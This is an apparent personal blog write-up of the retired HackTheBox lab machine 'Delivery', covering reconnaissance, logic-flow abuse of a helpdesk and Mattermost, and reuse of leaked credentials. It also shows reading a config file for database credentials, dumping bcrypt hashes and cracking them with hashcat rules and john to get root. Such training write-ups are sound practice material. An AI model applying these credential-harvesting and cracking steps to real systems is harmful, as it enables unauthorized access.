
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This is a writeup about a retired HacktheBox machine: Delivery created by ippsec and publish on January 9 2021. This box is classified as an easy machine. The user part involve to understand a process and exploit some functionnal flow. The root part implies enumeration and cracking somes hashes binary." />
<meta name="keywords" content="security, boot2root, HTB, Linux, john">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Delivery"/>
  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Delivery created by ippsec and publish on January 9 2021. This box is classified as an easy machine. The user part involve to understand a process and exploit some functionnal flow. The root part implies enumeration and cracking somes hashes binary."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2021/05/htb-delivery.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2021-05-24 09:40:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="Linux"/>
  <meta property="article:tag" content="john"/>
  <meta property="og:image" content="https://maggick.fr/media/image.png">

  <title>maggick's logs &ndash; HTB: Delivery</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/media/image.png" alt="" title="">
      </a>

      <h1>
        <a href="../../"></a>
      </h1>



      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-delivery">HTB: Delivery</h1>
    <p>
      Posted on 24 May 2021 in <a href="../../category/security.html">security</a>

        &#8226; 4 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2021.05/delivery_card.png" alt="Delivery card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/308">Delivery</a> created by
<a href="https://www.hackthebox.com/home/users/profile/3769">ippsec</a> and publish on
January 9 2021.
This box is classified as an easy machine. The user part involve to understand a
process and exploit some functionnal flow.
The root part implies enumeration and cracking somes hashes binary.</p>


<h1>User</h1>
<h2>Recon</h2>
<p>We start with an nmap scan. Only ports 22 (SSH) and 80 (HTTP) are open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.91 scan initiated Sat Feb 13 08:48:43 2021 as: nmap -sSV -oN nmap 10.129.95.75
Nmap scan report for 10.129.95.75
Host is up (0.013s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    nginx 1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 13 08:48:51 2021 -- 1 IP address (1 host up) scanned in 7.42 seconds
</code></pre></div>

<h2>Web</h2>
<p><img alt="Homepage" src="/media/2021.05/delivery_01.png"></p>
<p>Looking at the "contact-us" section we discover that we will probably need a
email adresse on the "delivery.htb" domain in order to access the MatterMost
server.</p>
<blockquote>
<p>For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server.</p>
</blockquote>
<p>We got to the help desk page.</p>
<p><img alt="help desk page" src="/media/2021.05/delivery_02.png"></p>
<p>We create a ticket and got an associated email adresse with the <ticket number>@delivery.htb</p>
<p><img alt="associated email address" src="/media/2021.05/delivery_03.png"></p>
<p>we create an account on mettermost with this email and got the verification URL on the ticket</p>
<p><img alt="Registering on mattermost email" src="/media/2021.05/delivery_035.png"></p>
<p><img alt="mattermost verification link" src="/media/2021.05/delivery_04.png"></p>
<p>The discussion give us the creds for the OSTicket application and disclose some info about password reuse</p>
<blockquote>
<p>root
9:29 AM</p>
<p>@developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail!</p>
<p>Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
root
10:58 AM</p>
<p>PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.</p>
</blockquote>
<p>We can now access the OSticket panel as an admin using the agent panel http://helpdesk.delivery.htb/scp/login.php</p>
<p><img alt="OSticket panel" src="/media/2021.05/delivery_05.png"></p>
<p>The mailideriverer account also got an SSH account on the box which allow us to
get the user flag.</p>
<div class="highlight"><pre><span></span><code>$ ssh maildeliverer@delivery.htb
maildeliverer@delivery.htb&#39;s password:
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
&lt;SNIP&gt;
maildeliverer@Delivery:~$ cat user.txt
2300770247a4dfb6f57de6d717d86b9c
</code></pre></div>

<h1>Root</h1>
<p>We enumerate our user permission and found the MatterMost configuration file
containing the crendentials to access the database</p>
<div class="highlight"><pre><span></span><code>maildeliverer@Delivery:~$ cat /opt/mattermost/config/config.json
{
    &quot;ServiceSettings&quot;: {
        &quot;SiteURL&quot;: &quot;&quot;,
        &quot;WebsocketURL&quot;: &quot;&quot;,
        &quot;LicenseFileLocation&quot;: &quot;&quot;,
        &quot;ListenAddress&quot;: &quot;:8065&quot;,
        &quot;ConnectionSecurity&quot;: &quot;&quot;,
        &quot;TLSCertFile&quot;: &quot;&quot;,
&lt;SNIP&gt;
  },
    &quot;SqlSettings&quot;: {
        &quot;DriverName&quot;: &quot;mysql&quot;,
        &quot;DataSource&quot;: &quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&quot;,
        &quot;DataSourceReplicas&quot;: [],
</code></pre></div>

<p>We connect to the mysql database, enumerate the tables and dump the users and
password from the <code>Users</code> table.</p>
<div class="highlight"><pre><span></span><code>maildeliverer@Delivery:~$ #mmuser:Crack_The_MM_Admin_PW
maildeliverer@Delivery:~$ mysql -u mmuser -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 382
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.

MariaDB [(none)]&gt; show database
    -&gt; ;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;database&#39; at line 1
MariaDB [(none)]&gt; SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]&gt; use mattermost;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mattermost]&gt; show tables;
+------------------------+
| Tables_in_mattermost   |
+------------------------+
| Audits                 |
| Bots                   |
&lt;SNIP&gt;
| UserAccessTokens       |
| UserGroups             |
| UserTermsOfService     |
| Users                  |
+------------------------+
46 rows in set (0.001 sec)


MariaDB [mattermost]&gt; select Username,Password from Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| john5412663                      | $2a$10$hF3jgrGBPYT2LaXISy67K.lAaTNaOKJfruZTWSzQo..ZI9dHctf7a |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
| john                             | $2a$10$.uKtro1Yc15ZycqOJX1X/.m6yg7VSD60EUV58BJ4SVgg0xsYzrKe2 |
+----------------------------------+--------------------------------------------------------------+
9 rows in set (0.000 sec)

MariaDB [mattermost]&gt; exit
Bye
</code></pre></div>

<p>We create a dictionary using the disclosed password and using <code>hashcat</code> rules we
generate a few variations.</p>
<div class="highlight"><pre><span></span><code>$ cat dic
PleaseSubscribe!

$ hashcat --force dic -r /usr/share/hashcat/rules/best64.rule --stdout &gt; dic_hc
</code></pre></div>

<p>We pass this variation dictionary to <code>john</code> with the database hashes, and found
a password.</p>
<div class="highlight"><pre><span></span><code>$ john hash -w=dic_hc
Warning: detected hash type &quot;bcrypt&quot;, but the string is also recognized as &quot;bcrypt-opencl&quot;
Use the &quot;--format=bcrypt-opencl&quot; option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
PleaseSubscribe!21 (?)
Warning: Only 5 candidates left, minimum 24 needed for performance.
1g 0:00:00:02 DONE (2021-02-13 17:19) 0.3424g/s 26.36p/s 182.8c/s 182.8C/s asP..PeSubs
</code></pre></div>

<p>We use this password to long as root on the box and get the final flag.</p>
<div class="highlight"><pre><span></span><code>maildeliverer@Delivery:~$ su
Password:
root@Delivery:/home/maildeliverer# cd
root@Delivery:~# cat /root/root.txt
09679395029c940e9acea1ceab2cf76a
</code></pre></div>

<h1>Wrapping up</h1>
<p>A really interesting an realistic box. There is no technical vulnerability or
exploit to use here. Just reading the applications and understanding what is
needed and found a way to achieve our attacker goal.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/linux.html">Linux</a>
      <a href="../../tag/john.html">john</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2021/05/htb-laboratory.html" title="HTB: Laboratory">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2021/06/htb-scriptkiddie.html" title="HTB: ScriptKiddie">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>

</body>
</html>